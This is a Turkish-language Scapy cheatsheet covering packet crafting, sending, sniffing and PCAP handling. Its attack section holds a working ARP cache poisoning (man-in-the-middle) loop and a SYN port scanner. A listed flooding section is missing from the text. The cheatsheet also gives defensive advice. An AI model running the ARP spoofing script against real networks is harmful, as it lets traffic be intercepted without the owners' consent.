# 🐍 Scapy - Kapsamlı Başvuru Rehberi (Cheatsheet)

[🇺🇸 English Version](../README.md)

```
  ███████╗ ██████╗ █████╗ ██████╗ ██╗   ██╗
  ██╔════╝██╔════╝██╔══██╗██╔══██╗╚██╗ ██╔╝
  ███████╗██║     ███████║██████╔╝ ╚████╔╝ 
  ╚════██║██║     ██╔══██║██╔═══╝   ╚██╔╝  
  ███████║╚██████╗██║  ██║██║        ██║   
  ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝        ╚═╝   
       Etkileşimli Paket Üretme, Dinleme ve Değiştirme Motoru
```

<p align="center">
  <img src="https://img.shields.io/badge/Scapy-Paket_Üretici-blue?style=for-the-badge" alt="Scapy">
  <img src="https://img.shields.io/badge/Geliştirici-Philippe_Biondi-orange?style=for-the-badge" alt="secdev">
  <img src="https://img.shields.io/badge/Dil-Python-green?style=for-the-badge" alt="Python">
  <img src="https://img.shields.io/badge/Kategori-Ağ_Saldırıları-purple?style=for-the-badge" alt="Network Attacks">
</p>

<p align="center">
  <b>🐍 İstenilen ağ protokolünde ham paket üretebilen, gönderen, yakalayan (sniff), çözen ve protokol fuzzing'i yapabilen Python tabanlı etkileşimli paket manipülasyon aracı ve kütüphanesi</b>
</p>

---

## 📋 İçindekiler

- [Genel Bakış ve Katman İstifleme Modeli (`/`)](#-genel-bakış-ve-katman-i̇stifleme-modeli-)
- [Kurulum](#-kurulum)
- [Etkileşimli Kabuğu Başlatma](#-etkileşimli-kabuğu-başlatma)
- [Ağ Paketleri Oluşturma (Crafting)](#-ağ-paketleri-oluşturma-crafting)
  - [IP ve TCP Paketleri](#ip-ve-tcp-paketleri)
  - [ICMP Ping ve Traceroute](#icmp-ping-ve-traceroute)
  - [Ham DNS Sorguları](#ham-dns-sorguları)
- [Paket Gönderme ve Yanıt Alma](#-paket-gönderme-ve-yanıt-alma)
  - [Katman 3: `send()`, `sr()`, `sr1()`](#katman-3-send-sr-sr1)
  - [Katman 2: `sendp()`, `srp()`, `srp1()`](#katman-2-sendp-srp-srp1)
- [Paket Yakalama (Sniffing) ve PCAP Yönetimi](#-paket-yakalama-sniffing-ve-pcap-yönetimi)
  - [Canlı Ağ Trafiği Yakalama (`sniff()`)](#canlı-ağ-trafiği-yakalama-sniff)
  - [PCAP Dosyalarını Okuma ve Yazma](#pcap-dosyalarını-okuma-ve-yazma)
- [Saldırı Senaryoları](#-saldırı-senaryoları)
  - [ARP Önbellek Zehirleme (MITM)](#arp-önbellek-zehirleme-mitm)
  - [SYN Port Tarayıcı Betiği](#syn-port-tarayıcı-betiği)
  - [TCP SYN / ICMP Sel Saldırısı (Flooding)](#tcp-syn--icmp-sel-saldırısı-flooding)
- [Hızlı Referans Tablosu](#-hızlı-referans-tablosu)
- [Savunma Yöntemleri ve Tespit](#-savunma-yöntemleri-ve-tespit)
- [Yasal Uyarı](#-yasal-uyarı)

---

## 🎯 Genel Bakış ve Katman İstifleme Modeli (`/`)

**Philippe Biondi** tarafından geliştirilen **Scapy**, onlarca özel ağ aracının (ping, traceroute, arpspoof, nmap temel taramaları) yerini tek başına alabilir.

Scapy'nin en güçlü yanı Python'ın bölme işlecini (`/`) kullanarak protokol katmanlarını birbirine bağlamasıdır:
```python
paket = Ether() / IP(dst="192.168.1.1") / TCP(dport=80, flags="S") / "Saldırı Verisi"
```
Her katmanın varsayılan değerleri (checksum, paket uzunluğu, kaynak IP, MAC adresi) Scapy tarafından otomatik hesaplanır.

---

## 📥 Kurulum

```bash
# Debian / Ubuntu / Kali Linux
sudo apt update && sudo apt install -y python3-scapy

# Python pip ile Kurulum
pip install scapy

# Arch Linux
sudo pacman -S python-scapy
```

---

## 🚀 Etkileşimli Kabuğu Başlatma

Ham soket paketleri üretmek root yetkisi gerektirdiğinden `sudo` ile başlatın:

```bash
sudo scapy
```

Scapy kabuğu içerisinde desteklenen fonksiyon ve protokolleri inceleme:
```python
>>> ls()          # Desteklenen 850+ ağ protokolünü listele
>>> ls(IP)        # IP katmanının alanlarını ve varsayılan değerlerini göster
>>> lsc()         # Scapy fonksiyonlarını (komutlarını) listele
```

---

## 🛠️ Ağ Paketleri Oluşturma (Crafting)

### IP ve TCP Paketleri
```python
# 80 portuna TCP SYN paketi oluştur
syn_pkt = IP(dst="192.168.1.50") / TCP(dport=80, flags="S")
syn_pkt.show()
```

### ICMP Ping ve Traceroute
```python
# ICMP Echo Request gönderip ilk yanıtı bekleme (sr1)
yanit = sr1(IP(dst="8.8.8.8")/ICMP(), timeout=2)
if yanit:
    yanit.show()

# Otomatik grafiksel TCP traceroute
ans, unans = traceroute(["8.8.8.8", "1.1.1.1"], dport=443, maxttl=20)
```

### Ham DNS Sorguları
```python
# 8.8.8.8 sunucusuna example.com A kaydı için DNS sorgusu üretme
dns_sorgu = IP(dst="8.8.8.8") / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname="example.com"))
cevap = sr1(dns_sorgu, verbose=False)
print(cevap[DNS].summary())
```

---

## 📡 Paket Gönderme ve Yanıt Alma

Scapy gönderim fonksiyonlarını OSI katmanlarına göre ayırır:

### Katman 3: `send()`, `sr()`, `sr1()`
Ethernet başlığını çekirdeğe bırakır, IP katmanından başlar:
- `send(pkt)`: Paketi gönderir, yanıt beklemez.
- `sr(pkt)`: Paketleri gönderir, yanıtlanan ve yanıtlanmayan çiftini döner `(ans, unans)`.
- `sr1(pkt)`: Paketi gönderir ve yalnızca gelen **ilk** yanıt paketini döner.

### Katman 2: `sendp()`, `srp()`, `srp1()`
Ethernet çerçevesini doğrudan yönetir (`Ether()` ile başlar):
- `sendp(Ether() / IP(...), iface="eth0")`: Ham Ethernet çerçevesi gönder.
- `srp(Ether() / ARP(...))`: ARP isteği gönder ve yanıtı al.

---

## 🔍 Paket Yakalama (Sniffing) ve PCAP Yönetimi

### Canlı Ağ Trafiği Yakalama (`sniff()`)
```python
# eth0 arayüzünden 10 paket yakala
paketler = sniff(iface="eth0", count=10)

# BPF (Berkeley Packet Filter) filtresi ile yakalama
http_paketleri = sniff(filter="tcp port 80 or port 443", count=20)

# Yakalanan her paketi özel fonksiyondan geçirme
def paket_yazdir(paket):
    if paket.haslayer(TCP):
        print(f"[{paket[IP].src}:{paket[TCP].sport}] -> [{paket[IP].dst}:{paket[TCP].dport}]")

sniff(iface="eth0", prn=paket_yazdir, store=0)
```

### PCAP Dosyalarını Okuma ve Yazma
```python
# Yakalanan paketleri Wireshark PCAP formatında kaydetme
wrpcap("yakalama.pcap", paketler)

# Var olan PCAP dosyasını okuma
okunan = rdpcap("yakalama.pcap")
okunan[0].show()
```

---

## ⚔️ Saldırı Senaryoları

### ARP Önbellek Zehirleme (MITM)
Ağ geçidi ile kurban arasındaki trafiği araya almak için sahte ARP yanıtları gönderme:
```python
from scapy.all import *
import time

kurban_ip = "192.168.1.105"
ag_gecidi_ip = "192.168.1.1"

# Sahte ARP yanıt paketleri oluştur
kurban_arp = ARP(op=2, pdst=kurban_ip, psrc=ag_gecidi_ip)
ag_gecidi_arp = ARP(op=2, pdst=ag_gecidi_ip, psrc=kurban_ip)

print("[*] ARP tabloları zehirleniyor...")
try:
    while True:
        send(kurban_arp, verbose=False)
        send(ag_gecidi_arp, verbose=False)
        time.sleep(2)
except KeyboardInterrupt:
    print("[*] Durduruldu.")
```

### SYN Port Tarayıcı Betiği
```python
def port_tara(ip, port):
    pkt = IP(dst=ip) / TCP(dport=port, flags="S")
    yanit = sr1(pkt, timeout=1, verbose=False)
    if yanit and yanit.haslayer(TCP):
        if yanit[TCP].flags == 0x12: # SYN-ACK alındı
            print(f"[+] Port {port} AÇIK")
            # Kibarlık gereği bağlantıyı sıfırla
            send(IP(dst=ip)/TCP(dport=port, flags="R"), verbose=False)

port_tara("192.168.1.1", 80)
```

---

## ⚡ Hızlı Referans Tablosu

| Amaç | Scapy Komutu |
|------|--------------|
| **Etkileşimli Kabuğu Aç** | `sudo scapy` |
| **Protokol Alanlarını Gör** | `ls(IP)` veya `ls(TCP)` |
| **Katman 3 Paket Gönder** | `send(IP(dst="1.1.1.1")/ICMP())` |
| **Gönder ve İlk Yanıtı Al** | `yanit = sr1(IP(dst="1.1.1.1")/ICMP())` |
| **Katman 2 Çerçeve Gönder** | `sendp(Ether()/IP(...), iface="eth0")` |
| **Filtreli Paket Dinle** | `sniff(iface="eth0", filter="icmp", count=5)` |
| **PCAP Olarak Kaydet** | `wrpcap("cikti.pcap", paketler)` |
| **PCAP Dosyası Oku** | `paketler = rdpcap("giris.pcap")` |

---

## 🛡️ Savunma Yöntemleri ve Tespit

1. **Dynamic ARP Inspection (DAI):** Kurumsal anahtarlarda DAI ve DHCP Snooping etkinleştirilerek sahte ARP paketleri engellenmelidir.
2. **IDS/IPS Kuralları:** Scapy ile üretilen anormal TCP bayrak kombinasyonları (Xmas, NULL) ve yarım açık SYN taramaları IDS sistemlerince kolayca tespit edilir.

---

## ⚠️ Yasal Uyarı

> [!CAUTION]
> Scapy ağda hizmet aksatmaya (DoS) veya yetkisiz trafiği manipüle etmeye yol açabilecek güçlü fonksiyonlara sahiptir. Yalnızca yetkili güvenlik testlerinde ve izole laboratuvar ortamlarında kullanılmalıdır.
